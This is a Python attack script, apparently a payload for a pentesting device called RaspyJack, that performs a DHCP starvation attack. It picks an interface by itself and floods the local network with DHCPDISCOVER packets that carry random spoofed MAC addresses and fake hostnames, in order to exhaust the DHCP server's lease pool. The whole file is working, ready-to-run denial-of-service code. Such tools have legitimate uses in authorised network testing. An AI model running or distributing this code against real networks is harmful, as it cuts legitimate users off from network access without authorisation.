#!/usr/bin/env python3
# @name: DHCP Starvation
# @desc: DHCP starvation attack.
# @category: network
# @danger: true
# @active: true
# @web: true
"""
RaspyJack Payload -- DHCP Starvation
=====================================
Author: 7h30th3r0n3

DHCP starvation attack.  Floods the network with DHCPDISCOVER packets
using random MAC addresses to exhaust the DHCP server's lease pool.
Works on eth0 or wlan0 (no monitor mode needed).

Controls:
  python3 dhcp_starve.py [iface] [fast|slow] [duration_seconds]

    iface             -- optional network interface. If omitted, the
                          first "up" interface (eth0 preferred, then
                          wlan0, then any) is used.
    fast|slow         -- optional send rate (default: fast).
    duration_seconds  -- optional time to run (default: unbounded,
                          Ctrl-C stops the attack).

Loot: None (attack-only payload).
"""

import os
import sys
import time
import random
import struct
import threading
import subprocess
from datetime import datetime

sys.path.append(os.path.abspath(os.path.join(__file__, "..", "..", "..")))

try:
    from scapy.all import (
        Ether, IP, UDP, BOOTP, DHCP,
        sendp, conf, get_if_hwaddr,
    )
    SCAPY_OK = True
except ImportError:
    SCAPY_OK = False

# ---------------------------------------------------------------------------
# Constants
# ---------------------------------------------------------------------------
SPEED_MODES = ["fast", "slow"]
SPEED_DELAYS = {"fast": 0.01, "slow": 0.2}

# ---------------------------------------------------------------------------
# Shared state
# ---------------------------------------------------------------------------
lock = threading.Lock()
running = False
speed_idx = 0          # index into SPEED_MODES
packets_sent = 0
leases_claimed = 0
target_iface = None
target_subnet = "detecting..."

# ---------------------------------------------------------------------------
# Interface detection
# ---------------------------------------------------------------------------

def _detect_interface():
    """Find a suitable network interface (eth0 preferred, then wlan0)."""
    for candidate in ["eth0", "wlan0"]:
        try:
            state_path = f"/sys/class/net/{candidate}/operstate"
            if os.path.exists(state_path):
                with open(state_path) as fh:
                    state = fh.read().strip()
                if state == "up":
                    return candidate
        except Exception:
            pass
    # Fallback: any non-loopback interface that is up
    try:
        for name in os.listdir("/sys/class/net"):
            if name == "lo":
                continue
            state_path = f"/sys/class/net/{name}/operstate"
            if os.path.exists(state_path):
                with open(state_path) as fh:
                    if fh.read().strip() == "up":
                        return name
    except Exception:
        pass
    return None


def _detect_subnet(iface):
    """Detect the subnet of the given interface."""
    try:
        result = subprocess.run(
            ["ip", "-4", "addr", "show", iface],
            capture_output=True, text=True, timeout=5,
        )
        for line in result.stdout.splitlines():
            line = line.strip()
            if line.startswith("inet "):
                parts = line.split()
                return parts[1]  # e.g. "192.168.1.5/24"
    except Exception:
        pass
    return "unknown"

# ---------------------------------------------------------------------------
# Packet generation
# ---------------------------------------------------------------------------

def _random_mac_bytes():
    """Generate 6 random bytes for a MAC address."""
    octets = [random.randint(0, 255) for _ in range(6)]
    octets[0] = (octets[0] | 0x02) & 0xFE  # locally administered, unicast
    return bytes(octets)


def _random_mac_str(mac_bytes):
    """Format MAC bytes as colon-separated string."""
    return ":".join(f"{b:02x}" for b in mac_bytes)


def _random_hostname():
    """Generate a plausible random hostname."""
    prefixes = ["PC", "LAPTOP", "DESKTOP", "PHONE", "IPAD", "WORK"]
    return f"{random.choice(prefixes)}-{random.randint(1000, 9999)}"


def _build_dhcp_discover(mac_bytes, hostname):
    """Build a DHCPDISCOVER packet with the given MAC and hostname."""
    mac_str = _random_mac_str(mac_bytes)
    xid = random.randint(1, 0xFFFFFFFF)

    pkt = (
        Ether(src=mac_str, dst="ff:ff:ff:ff:ff:ff")
        / IP(src="0.0.0.0", dst="255.255.255.255")
        / UDP(sport=68, dport=67)
        / BOOTP(chaddr=mac_bytes + b"\x00" * 10, xid=xid)
        / DHCP(options=[
            ("message-type", "discover"),
            ("hostname", hostname),
            "end",
        ])
    )
    return pkt

# ---------------------------------------------------------------------------
# Attack thread
# ---------------------------------------------------------------------------

def _attack_thread():
    """Flood DHCPDISCOVER packets in background."""
    global packets_sent, leases_claimed

    while running:
        mac_bytes = _random_mac_bytes()
        hostname = _random_hostname()
        pkt = _build_dhcp_discover(mac_bytes, hostname)

        try:
            sendp(pkt, iface=target_iface, verbose=False)
            with lock:
                packets_sent += 1
                # Each discover is a potential lease claim
                leases_claimed += 1
        except Exception:
            pass

        delay = SPEED_DELAYS[SPEED_MODES[speed_idx]]
        time.sleep(delay)


# ---------------------------------------------------------------------------
# Main
# ---------------------------------------------------------------------------

def _usage():
    print(f"Usage: {os.path.basename(__file__)} [iface] [fast|slow] "
          f"[duration_seconds]", flush=True)
    print("  iface             network interface (optional; auto-detects "
          "eth0/wlan0/first-up if omitted)", flush=True)
    print("  fast|slow         send rate, default fast", flush=True)
    print("  duration_seconds  optional run time; Ctrl-C stops early",
          flush=True)


def main():
    global running, speed_idx, target_iface, target_subnet
    global packets_sent, leases_claimed

    args = sys.argv[1:]
    if args and args[0] in ("-h", "--help"):
        _usage()
        return 0

    if not SCAPY_OK:
        print("scapy not found! pip install scapy", flush=True)
        return 1

    iface_arg = None
    speed_arg = None
    duration_arg = None

    rest = list(args)
    if rest and rest[0] not in SPEED_MODES and not rest[0].isdigit():
        iface_arg = rest.pop(0)
    if rest and rest[0] in SPEED_MODES:
        speed_arg = rest.pop(0)
    if rest:
        duration_arg = rest.pop(0)

    if speed_arg:
        speed_idx = SPEED_MODES.index(speed_arg)

    duration = None
    if duration_arg:
        try:
            duration = max(1, int(duration_arg))
        except ValueError:
            _usage()
            return 1

    target_iface = iface_arg or _detect_interface()
    if not target_iface:
        print("No interface up! Specify one explicitly.", flush=True)
        return 1
    target_subnet = _detect_subnet(target_iface)

    print(f"[*] Interface: {target_iface}  Subnet: {target_subnet}  "
          f"Speed: {SPEED_MODES[speed_idx]}", flush=True)
    print("[*] Flooding DHCPDISCOVER with random MACs... "
          "(Ctrl-C to stop)", flush=True)

    packets_sent = 0
    leases_claimed = 0
    running = True
    thread = threading.Thread(target=_attack_thread, daemon=True)
    thread.start()

    try:
        start = time.time()
        last_report = 0
        while duration is None or time.time() - start < duration:
            time.sleep(1)
            elapsed = int(time.time() - start)
            if elapsed - last_report >= 5:
                last_report = elapsed
                with lock:
                    ps = packets_sent
                    lc = leases_claimed
                ts = datetime.now().strftime("%H:%M:%S")
                print(f"[{ts}] {elapsed}s elapsed  sent={ps} "
                      f"leases~{lc}", flush=True)
    except KeyboardInterrupt:
        print("\n[*] Stopping...", flush=True)
    finally:
        running = False
        thread.join(timeout=3)

    with lock:
        ps = packets_sent
        lc = leases_claimed

    print(f"[*] Summary: iface={target_iface} sent={ps} "
          f"leases_claimed~{lc}", flush=True)
    return 0


if __name__ == "__main__":
    raise SystemExit(main())
